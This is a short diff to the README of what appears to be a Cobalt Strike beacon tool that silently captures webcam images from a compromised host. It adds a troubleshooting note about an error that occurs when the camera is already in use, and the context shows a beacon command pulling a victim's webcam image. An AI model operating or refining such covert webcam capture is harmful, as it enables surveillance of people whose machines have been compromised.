@@ -32,7 +32,13 @@ beacon> webcam_bof sad.jpeg 2
 [*] Downloading JPEG over beacon as a screenshot
 [*] received screenshot of Webcam from Admin (328kb)
 ```
-
+Note: the following error
+```
+[*] Capturing image data
+[+] received output:
+[ERROR] ReadSample failed with HRESULT: 0xc00d3704
+```
+usually indicates that the webcam is currently in use.
 
 ## Notes
 
